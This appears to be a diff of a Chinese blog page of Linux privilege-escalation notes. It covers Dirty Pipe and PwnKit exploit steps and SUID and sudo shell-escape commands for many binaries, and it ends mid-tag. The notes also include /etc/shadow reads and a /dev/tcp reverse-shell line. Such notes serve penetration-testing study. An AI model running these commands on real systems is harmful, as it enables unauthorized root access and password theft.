@@ -16,15 +16,15 @@
   <meta name="author" content="ixpqxi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-0847 https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程 1.将">
+    <meta name="description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-08471https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git   利用前提 15.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102  利用流程 12341.将项目">
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限提升">
 <meta property="og:url" content="https://ixpqxi.github.io/2022/08/20/46bb6cfbfdcb/index.html">
 <meta property="og:site_name" content="Blog">
-<meta property="og:description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-0847 https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git 123+ 利用前提 5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102 123+ 利用流程 1.将">
+<meta property="og:description" content="一、Linux提权(1)通过利用漏洞提权1、CVE-2016-5195（”脏牛”漏洞）2、CVE-2022-08471https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git   利用前提 15.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102  利用流程 12341.将项目">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-08-20T07:55:24.000Z">
-<meta property="article:modified_time" content="2025-10-26T05:08:47.410Z">
+<meta property="article:modified_time" content="2026-07-02T08:14:01.040Z">
 <meta property="article:author" content="ixpqxi">
 <meta property="article:tag" content="web security">
 <meta name="twitter:card" content="summary_large_image">
@@ -276,7 +276,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/sky.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -316,7 +316,7 @@
         
         
         
-          16 mins
+          15 mins
         
       </span>
     
@@ -358,173 +358,244 @@
             
               <div class="markdown-body">
                 
-                <h1 id="一、Linux提权"><a href="#一、Linux提权" class="headerlink" title="一、Linux提权"></a>一、Linux提权</h1><h2 id="1-通过利用漏洞提权"><a href="#1-通过利用漏洞提权" class="headerlink" title="(1)通过利用漏洞提权"></a>(1)通过利用漏洞提权</h2><h4 id="1、CVE-2016-5195（”脏牛”漏洞）"><a href="#1、CVE-2016-5195（”脏牛”漏洞）" class="headerlink" title="1、CVE-2016-5195（”脏牛”漏洞）"></a>1、CVE-2016-5195（”脏牛”漏洞）</h4><h4 id="2、CVE-2022-0847"><a href="#2、CVE-2022-0847" class="headerlink" title="2、CVE-2022-0847"></a>2、CVE-2022-0847</h4><ul>
-<li><pre><code class="hljs">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 利用前提<br><br></code></pre></td></tr></table></figure>
-5.8 &lt;= Linux kernel &lt; 5.16.11/5.15.25/5.10.102
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 利用流程<br><br></code></pre></td></tr></table></figure>
-1.将项目上传到目标主机
-2.在文件夹下运行./compile.sh
-3.运行./exploit
-4.运行后root用户的密码被修改为aaron，通过su命令输入密码进行提权
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>#### <span class="hljs-number">3</span>、CVE<span class="hljs-number">-2021</span><span class="hljs-number">-4034</span><br><br>+ 参考链接<br><br></code></pre></td></tr></table></figure>
-http://its.dlut.edu.cn/info/1054/78309.htm
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 漏洞介绍<br><br>  权限提升漏洞（CVE-2021-4034)是由于pkexec无法正确处理调用参数，从而将环境变量作为命令执行，具有任意用户权限的攻击者都可以在默认配置下通过修改环境变量来利用此漏洞，从而获得受影响主机的root权限。<br><br><span class="hljs-bullet">+</span> 影响范围<br><br>  Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。<br><br>  不受影响的Linux版本:<br><br></code></pre></td></tr></table></figure>
-CentOS：
-    CentOS 6：polkit-0.96-11.el6_10.2
-    CentOS 7：polkit-0.112-26.el7_9.1
-    CentOS 8.0：polkit-0.115-13.el8_5.1
-    CentOS 8.2：polkit-0.115-11.el8_2.2
-    CentOS 8.4：polkit-0.115-11.el8_4.2
-    
-Ubuntu：
-    Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
-    Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
-    Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
-    Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
-    Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1
-    
-Debain：
-    Debain stretch：policykit-1 0.105-18+deb9u2
-    Debain buster：policykit-1 0.105-25+deb10u1
-    Debain bullseye：policykit-1 0.105-31+deb11u1
-    Debain bookworm,bullseye：policykit-1 0.105-31.1
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 版本检测<br><br><span class="hljs-bullet">  +</span> CentOS<br><br></code></pre></td></tr></table></figure>
-  rpm -qa polkit
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> Ubuntu<br><br></code></pre></td></tr></table></figure>
-  dpkg -l policykit-1
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 漏洞利用<br><br><span class="hljs-bullet">  +</span> 漏洞利用项目<br><br></code></pre></td></tr></table></figure>
-  https://github.com/berdav/CVE-2021-4034.git
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 将利用文件上传到目标主机<br><br><span class="hljs-bullet">+</span> 在文件夹下编译<br><br></code></pre></td></tr></table></figure>
-  make
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 运行漏洞利用程序<br><br></code></pre></td></tr></table></figure>
-  ./cve-2021-4034
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 运行后成功会返回一个root权限的shell，如果失败程序会自动退出，显示:<br><br></code></pre></td></tr></table></figure>
-  pkexec --version |
-         --help |
-         --disable-internal-agent |
-         [--user username] PROGRAM [ARGUMENTS...]
-  
-  See the pkexec manual page for more details.
-  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## (<span class="hljs-number">2</span>)通过第三方应用提权<br><br>#### <span class="hljs-number">1</span>、利用应用的suid提权<br><br>+ suid是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.。所以可以通过利用具有suid权限的第三方应用提权。<br><br>+ 常见具有suid权限的Linux可执行文件<br><br></code></pre></td></tr></table></figure>
-find、vim、less、cp、namp、more、nano
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 通过命令寻找具有suid权限的可执行文件<br><br></code></pre></td></tr></table></figure>
-find / -perm -u=s -type f 2&gt;/dev/null
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>或<br><br></code></pre></td></tr></table></figure>
-find / -user root -perm -4000 -print 2&gt;/dev/null
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>或<br><br></code></pre></td></tr></table></figure>
-find / -user root -perm -4000 -exec ls -ldb &#123;&#125;;
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 具体利用过程<br><br><span class="hljs-bullet">  +</span> find的suid提权<br><br><span class="hljs-code">    1.执行whoami</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure>
-  &gt;find / -exec whoami \; -quit
-  root
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>注：如果不加`-quit`命令会多次执行，加后只执行一次后退出<br><br><span class="hljs-number">2</span>.启动一个本地root权限的shell<br><br></code></pre></td></tr></table></figure>
-  find / -exec /bin/sh \; -quit
-  <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><br><span class="hljs-number">3</span>.启动一个远程的root权限的<span class="hljs-keyword">shell</span><br><br></code></pre></td></tr></table></figure>
-  find / -exec bash -ip &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1 \; -quit
-  <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>+ <span class="hljs-keyword">bash提权</span><br><span class="hljs-keyword"></span><br>  <span class="hljs-number">1</span>.确定<span class="hljs-keyword">bash具有suid权限</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure>
-  &gt;ls -al /bin/bash
-  -rwsr-sr-x 1 root root 1234376 Feb 24  2021 /bin/bash
-  <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><br><span class="hljs-number">2</span>.启动一个本地root权限的<span class="hljs-keyword">shell</span><br><br></code></pre></td></tr></table></figure>
-  bash -p
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  注：如果shell启动时有效用户(组)id不等于实际用户(组)id，在调用时提供-p选项，则启动行为(权限)相同，但有效用户id未重置。<br><br>+ vi / vim的suid提权<br><br>  如果vim程序具有suid权限，可以访问`/etc/shadow`文件获取用户密码的加密值，随后使用`john`工具暴力破解或直接修改为已知密码的加密值。<br><br></code></pre></td></tr></table></figure>
-  vim /etc/shadow
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ less的suid提权<br><br>  也是泄露`/etc/shadow`文件的内容<br><br></code></pre></td></tr></table></figure>
-  less /etc/shadow
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ more的suid提权<br><br>  也是泄露`/etc/shadow`文件的内容<br><br></code></pre></td></tr></table></figure>
-  more /etc/shadow
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ curl提权<br><br>  也是泄露`/etc/shadow`文件的内容<br><br></code></pre></td></tr></table></figure>
-  curl file:///etc/shadow
-  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>+ man提权<br><br>  也是泄露`/etc/shadow`文件的内容<br><br></code></pre></td></tr></table></figure>
-  man /etc/shadow
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  + <span class="hljs-built_in">mv</span>或<span class="hljs-built_in">cp</span>提权<br><br>    使用<span class="hljs-built_in">mv</span>或使用<span class="hljs-built_in">cp</span>的提权的原理就是制作已知密码的shadow或passwd文件，通过复制覆盖原本的`/etc/shadow`文件或`/etc/passwd`文件<br><br><span class="hljs-comment">#### 2、利用sudo命令提权</span><br><br>+ 该方式是在低权限用户拥有运行<span class="hljs-built_in">sudo</span>命令的权限时进行提权，该方式提权的原理和使用的某些应用很类似，但利用前提有区别。用户在使用<span class="hljs-built_in">sudo</span>命令时需要输入当前用户密码，所以该方式需要破解到用户的密码(有时用户配置了不需要密码，该情况就很容易提权了)。在渗透时，如果发现同个可执行文件存在suid权限和使用<span class="hljs-built_in">sudo</span>权限，那两种方式都可用；如果只存在suid权限或只存在使用<span class="hljs-built_in">sudo</span>，那只能用相应的一种。在实际中用户的使用<span class="hljs-built_in">sudo</span>权限有如下3种情况：<br><br></code></pre></td></tr></table></figure>
-1.全部命令都可以使用sudo
-2.只有部分命令可以使用sudo
-3.该用户不可使用sudo
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ 通过命令获取该用户可执行<span class="hljs-built_in">sudo</span>的命令<br><br></code></pre></td></tr></table></figure>
-sudo -l
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> 具体利用过程<br><br><span class="hljs-bullet">  +</span> find的sudo提权<br><br><span class="hljs-code">    和find的suid提权类似，只是加多个sudo命令，随后需要输入当前用户密码即可</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure>
-  sudo find / -exec whoami \; -quit
-  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><br>+ <span class="hljs-keyword">less</span>的sudo提权<br><br>  原理与<span class="hljs-keyword">less</span>的suid提权有所不同，该方式是利用sudo命令执行<span class="hljs-keyword">less</span>使得其获得高权限，随后在内部执行命令从而返回一个高权限的shell<br><br>  <span class="hljs-number">1</span>.使用带sudo的<span class="hljs-keyword">less</span><br><br></code></pre></td></tr></table></figure>
-  sudo less [file_name]
-  <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><br><span class="hljs-number">2</span>.在less的命令行模式输入命令调用<span class="hljs-keyword">shell</span><br><br></code></pre></td></tr></table></figure>
-  :!/bin/sh
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ more的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
-  sudo more [file_name]
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  !/bin/sh
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ vim的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
-  sudo vim
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  :set shell=/bin/sh
-  :shell
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ nano的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
-  sudo nano
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  curl+T        \\[^T]
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  whoami
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ man的<span class="hljs-built_in">sudo</span>提权<br><br></code></pre></td></tr></table></figure>
-  sudo man man
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  !/bin/sh
-  <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-operator">+</span> awk <span class="hljs-symbol">/</span> gawk <span class="hljs-symbol">/</span> mawk提权<br><br></code></pre></td></tr></table></figure>
-  sudo awk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">  <br>或<br>  <br></code></pre></td></tr></table></figure>
-  sudo gawk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">  <br>或<br>  <br></code></pre></td></tr></table></figure>
-  sudo mawk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>+ <span class="hljs-built_in">env</span>提权<br><br></code></pre></td></tr></table></figure>
-  sudo env /bin/sh
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> ftp提权<br><br></code></pre></td></tr></table></figure>
-  sudo ftp
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  ftp&gt; !/bin/sh
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> perl提权<br><br></code></pre></td></tr></table></figure>
-  sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> tmux提权<br><br></code></pre></td></tr></table></figure>
-  sudo tmux
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> apt提权<br><br></code></pre></td></tr></table></figure>
-  TF=$(mktemp)
-  echo &#39;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#39; &gt; $TF
-  sudo apt-get install -c $TF sl
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> ed提权<br><br></code></pre></td></tr></table></figure>
-  sudo ed
-  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>
-  !/bin/sh
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> pip提权<br><br></code></pre></td></tr></table></figure>
-  TF=$(mktemp -d)
-  echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.py
-  sudo pip install $TF
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> git提权<br><br></code></pre></td></tr></table></figure>
-  sudo git -p help
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> zip提权<br><br></code></pre></td></tr></table></figure>
-  sudo zip -T --unzip-command=&quot;sh -c /bin/bash&quot;
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> taskset提权<br><br></code></pre></td></tr></table></figure>
-  sudo taskset 1 /bin/sh -p
-  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">+</span> strace<br><br></code></pre></td></tr></table></figure>
-  sudo strace -o/dev/null /bin/sh
-  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">  <br><br>## (<span class="hljs-number">3</span>)计划任务提权<br><br>查看Root用户的计划任务<br><br></code></pre></td></tr></table></figure>
-</code></pre>
+                <h1 id="一、Linux提权"><a href="#一、Linux提权" class="headerlink" title="一、Linux提权"></a>一、Linux提权</h1><h2 id="1-通过利用漏洞提权"><a href="#1-通过利用漏洞提权" class="headerlink" title="(1)通过利用漏洞提权"></a>(1)通过利用漏洞提权</h2><h4 id="1、CVE-2016-5195（”脏牛”漏洞）"><a href="#1、CVE-2016-5195（”脏牛”漏洞）" class="headerlink" title="1、CVE-2016-5195（”脏牛”漏洞）"></a>1、CVE-2016-5195（”脏牛”漏洞）</h4><h4 id="2、CVE-2022-0847"><a href="#2、CVE-2022-0847" class="headerlink" title="2、CVE-2022-0847"></a>2、CVE-2022-0847</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://github.com/Arinerron/CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">0847</span>-DirtyPipe-Exploit.git<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>利用前提</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span>.<span class="hljs-number">8</span> &lt;= Linux kernel &lt; <span class="hljs-number">5</span>.<span class="hljs-number">16</span>.<span class="hljs-number">11</span>/<span class="hljs-number">5</span>.<span class="hljs-number">15</span>.<span class="hljs-number">25</span>/<span class="hljs-number">5</span>.<span class="hljs-number">10</span>.<span class="hljs-number">102</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用流程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.将项目上传到目标主机<br>2.在文件夹下运行./compile.sh<br>3.运行./exploit<br>4.运行后root用户的密码被修改为aaron，通过su命令输入密码进行提权<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3、CVE-2021-4034"><a href="#3、CVE-2021-4034" class="headerlink" title="3、CVE-2021-4034"></a>3、CVE-2021-4034</h4><ul>
+<li><p>参考链接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://its.dlut.edu.cn/info/<span class="hljs-number">1054</span>/<span class="hljs-number">78309</span>.htm<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>漏洞介绍</p>
+<p>权限提升漏洞（CVE-2021-4034)是由于pkexec无法正确处理调用参数，从而将环境变量作为命令执行，具有任意用户权限的攻击者都可以在默认配置下通过修改环境变量来利用此漏洞，从而获得受影响主机的root权限。</p>
+</li>
+<li><p>影响范围</p>
+<p>Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。</p>
+<p>不受影响的Linux版本:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CentOS</span>：<br>	<span class="hljs-attribute">CentOS</span> <span class="hljs-number">6</span>：polkit-<span class="hljs-number">0</span>.<span class="hljs-number">96</span>-<span class="hljs-number">11</span>.el6_10.<span class="hljs-number">2</span><br>	<span class="hljs-attribute">CentOS</span> <span class="hljs-number">7</span>：polkit-<span class="hljs-number">0</span>.<span class="hljs-number">112</span>-<span class="hljs-number">26</span>.el7_9.<span class="hljs-number">1</span><br>	<span class="hljs-attribute">CentOS</span> <span class="hljs-number">8</span>.<span class="hljs-number">0</span>：polkit-<span class="hljs-number">0</span>.<span class="hljs-number">115</span>-<span class="hljs-number">13</span>.el8_5.<span class="hljs-number">1</span><br>	<span class="hljs-attribute">CentOS</span> <span class="hljs-number">8</span>.<span 